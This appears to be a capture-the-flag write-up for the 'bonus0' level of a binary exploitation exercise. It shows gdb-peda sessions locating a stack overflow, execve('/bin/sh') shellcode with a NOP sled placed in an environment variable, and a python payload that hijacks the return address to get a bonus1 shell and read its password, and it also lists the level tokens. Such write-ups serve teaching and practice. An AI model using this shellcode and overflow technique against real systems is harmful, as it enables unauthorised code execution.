# Bonus0 -

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| bonus0 | `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728` |
| bonus1 | `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

Execute the binary

```shell
~/bonus0 aaa
  -
  (stdin) a
  -
  (stdin) b
  > a b
```

There is 2 prompts, and it concatenates them.

Lets debug the binary

```shell
(gdb) info functions
0x080484b4  p
0x0804851e  pp
0x080485a4  main
```

See our assembly interpretation in [source file](../source.c)

```shell
./bonus0
  -
  (stdin) AAAAAAAAAAAAAAAAAAAA # 20 chars
  -
  (stdin) BBBBBBBBBBBBBBBBBBBB # 20 chars
  > AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBB
  Segmentation fault (core dumped)

./bonus0
   -
  (stdin) AAAAAAAAAAAAAAAAAAA # 19 chars
   -
  (stdin) BBBBBBBBBBBBBBBBBBBB # 20 chars
  > AAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB
```

```shell
gdb-peda$ b*main+28 # before puts
gdb-peda$ run
  (stdin) AAAAAAAAAAAAAAAAAAA # 19 chars
  (stdin) BBBBBBBBBBBBBBBBBBB # 19 chars
gdb-peda$ x/100x $esp+0x16
x/100x $esp+0x16
  0xbffff626:   [ 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
  0xbffff62e:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
  0xbffff636:     0x41    0x41    0x41    0x20    0x42    0x42    0x42    0x42
  0xbffff63e:     0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
  0xbffff646:     0x42    0x42    0x42    0x42    0x42    0x42    0x42 ]  0x00
  0xbffff64e:     0xfd    0xb7  { 0xd0    0x85    0x04    0x08 }  0x00    0x00
```

There is an offset at 23 chars after second prompt.

Finally we can get the pass !

```shell
$ whoami
> bonus1
$ cat /home/user/bonus0/.pass
>
```

```
b*main+18
  (stdin) ABCDEFGHIJKLMNOPQRSTUVWXYZ (A-T 20)
  (stdin) abcdefghijklmnopqrstuvwxyz
run
x/50x $esp+0x16
  0xbffff616:[0x44434241	0x48474645	0x4c4b4a49	0x504f4e4d
  0xbffff626:	0x54535251][0x64636261	0x68676665  0x6c6b6a69
  0xbffff636:	0x706f6e6d	0x74737271][0xb7fd0ff4][0x63626120
  0xbffff646:	0x67666564	0x6b6a6968	0x6f6e6d6c	0x73727170]
  0xbffff656:	0xfd0ff474	0xc85800b7	0x0000b7fd	0xf61c0000

# [A-T][a-t][0xb7fd0ff4][a-c]' '[d-s]
# 20    20  4            3    1  16

continue
EIP: 0x6d6c6b6a ('jklm')
Invalid $PC address: 0x6d6c6b6a
Stopped reason: SIGSEGV
0x6d6c6b6a in ?? ()
```

```
export SHELLCODE=$(python -c 'print "\x90" * 0xff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

```shell
gdb-peda$ searchmem SHELLCODE
  [stack] : 0xbffff864 ("SHELLCODE=1\300Ph//shh/bin\211\343PS\211\341\260\v̀")
gdb-peda$ p 0xbffff864 + 10 # (length of "SHELLCODE=")
$1 = 0xbffff86e


ABCDEFGHIJKLMNOPQRSTUVWXYZ
abcdefghi\x6e\xf8\xff\xbf

python -c 'print "A" * 4095 + "\n" + "abcdefghi" + "\x6e\xf8\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10

python -c 'print "A" * 4095 + "\n" + "abcdefghi" + "\x76\xf8\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10
```

```shell
cat /tmp/exploit10 - | ~/bonus0
   -
   -
  > AAAAAAAAAAAAAAAAAAAAabcdefghiwnopqrst abcdefghiwnopqrst
  $ whoami
  > bonus1
  $ cat /home/user/bonus1/.pass
  > cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

---

## Sources

### Hack

- [Buffer overflow et variable d'environnement](https://www.hacktion.be/buffer-overflow-variable-environnement/)
- [Buffer overflow works in gdb but not without it](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it)

### C

- [Man puts](https://linux.die.net/man/3/puts)
- [Man read](https://linux.die.net/man/3/read)
- [Man strchr](https://linux.die.net/man/3/strchr)
- [Man strcpy](https://linux.die.net/man/3/strcpy)
- [Man strncpy](https://linux.die.net/man/3/strncpy)
- [Man strcat](https://linux.die.net/man/3/strcat)
